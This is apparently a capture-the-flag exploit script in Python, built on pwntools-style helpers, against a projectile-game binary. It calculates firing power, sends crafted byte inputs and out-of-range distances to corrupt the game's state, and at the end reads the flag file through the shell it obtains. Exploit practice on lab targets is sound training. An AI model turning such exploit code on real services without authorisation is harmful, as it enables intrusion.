#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")
# context.log_level = "info"

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def checker(v0, theta):
    theta_rad = math.pi * theta / 180.0
    vx = math.cos(theta_rad) * v0
    vy = math.sin(theta_rad) * v0
    landing_point = vx * (2 * vy / 9.81)
    return int(landing_point)


def calc(distance, theta=45):
    """
    A more stable reverse calculation to find the initial velocity (v0) for a given distance,
    assuming the projectile is launched at a given angle theta.
    """
    g = 9.81  # Gravity in m/s^2

    # Convert angle to radians
    theta_rad = math.radians(theta)

    # Avoid division by zero or extremely small numbers in cosine or sine
    if math.isclose(theta_rad, 0, abs_tol=1e-9) or math.isclose(
        theta_rad, math.pi / 2, abs_tol=1e-9
    ):
        return float(
            "inf"
        )  # Returning infinity as v0 since the calculation is not feasible for 0 or 90 degrees

    # Calculate v0 using the formula derived from the projectile motion equation
    v0 = math.sqrt(distance * g / (2 * math.cos(theta_rad) * math.sin(theta_rad)))
    return v0


def calc_wrap(distance, theta=45):
    temp_res = calc(distance, theta)
    if checker(temp_res, theta) == distance:
        return temp_res
    elif checker(temp_res, theta) == distance - 1:
        return calc_wrap(distance, theta - 1)
    elif checker(temp_res, theta) == distance + 1:
        new_res = calc(distance - 1, theta)
        assert checker(new_res, theta) == distance
        return new_res


def pew(power, theta=45):
    ru(b"Enter power: \n")
    sl(str(power).encode())
    ru(b"Enter angle: \n")
    sl(i2b(theta))
    ru(b"will land at x = ")
    lg("target", int(ru(b" meters\n", drop=True)))
    ru(b"fire when ready!\n")
    sl(b"pew!12\xe6\x13")
    # ia()
    sl(b"pew!")


def process():
    ru(b"lives")
    ru(b"\n")
    ru(b"\n")
    ru(b"\n")
    ru(b'|"""\\-=')
    distance = len(ru(b"E")) - 3
    lg("distance", distance)
    res = calc_wrap(distance)
    print(res)
    pew(res)


for _ in range(3):
    process()


def new_process():
    ru(b"lives")
    ru(b"\n")
    ru(b"\n")
    ru(b"\n")
    ru(b'|"""\\-=')
    distance = len(ru(b"E")) - 3
    lg("distance", distance)
    res = calc_wrap(distance)
    print(res)
    ru(b"1 specialty ammo granted")
    ru(b"2: -\n")
    sl(b"2")
    pew(res)


# for _ in range(12):
#     new_process()

ru(b"1 specialty ammo granted")
ru(b"2: -\n")
sl(b"2")
pew(0)


for _ in range(3):
    process()

ru(b"1 specialty ammo granted")
ru(b"2: -\n")
sl(b"2")
pew(33)
pew(calc_wrap(115))

pew(calc_wrap(-0x12C, 135), 135)
pew(calc_wrap(-0x118, 135), 135)
for _ in range(3):
    process()
ru(b"1 specialty ammo granted")
ru(b"2: -\n")
sl(b"9")
# pew(calc_wrap(0x1 + 33 + 110))

ru(b"Enter power: \n")
sl(str(calc_wrap(34 + 110)).encode())
# sl(i2b(0))
ru(b"Enter angle: \n")
sl(i2b(45))
ru(b"will land at x = ")
lg("target", int(ru(b" meters\n", drop=True)))
ru(b"fire when ready!\n")
sl(b"pew!12\x13")
sl(b"pew!")


def new_pew(power, theta=45):
    ru(b"Enter power: \n")
    sl(str(power).encode())
    ru(b"Enter angle: \n")
    sl(i2b(theta))
    ru(b"will land at x = ")
    lg("target", int(ru(b" meters\n", drop=True)))
    ru(b"fire when ready!\n")
    sl(b"pew!12\x13")
    sl(b"pew!")


def new_process():
    ru(b"lives")
    ru(b"\n")
    ru(b"\n")
    ru(b"\n")
    ru(b'|"""\\-=')
    distance = len(ru(b"E")) - 3
    lg("distance", distance)
    res = calc_wrap(distance)
    print(res)
    new_pew(res)


ru(b"2: -\n")
sl(b"9")
ru(b"Enter power: \n")
sl(str(calc_wrap(35 + 110)).encode())
# sl(i2b(0))
ru(b"Enter angle: \n")
sl(i2b(45))
ru(b"will land at x = ")
lg("target", int(ru(b" meters\n", drop=True)))
ru(b"fire when ready!\n")
sl(b"pew!12\x04")
sl(b"pew!")

ru(b"2: -\n")
sl(b"9")
ru(b"Enter power: \n")
sl(str(calc_wrap(-0x12C, 135)).encode())
ru(b"Enter angle: \n")
sl(i2b(135))
ru(b"will land at x = ")
lg("target", int(ru(b" meters\n", drop=True)))
ru(b"fire when ready!\n")
sl(b"pew!12\x13")
sl(b"pew!")

sl(b"cat ./flag.txt")
# for _ in range(3):
#     process()

# pew(calc_wrap(0x7FFFFFFF + 8))
# ru(b"Enter power: \n")
# sl(str(calc_wrap(0x7FFFFFFF + 2)).encode())
# ru(b"Enter angle: \n")

# for _ in range(3):
#     process()
#
# ru(b"1 specialty ammo granted")
# ru(b"2: -\n")
# sl(b"2")
# pew(calc_wrap(0x11 + 33 + 110))


ia()
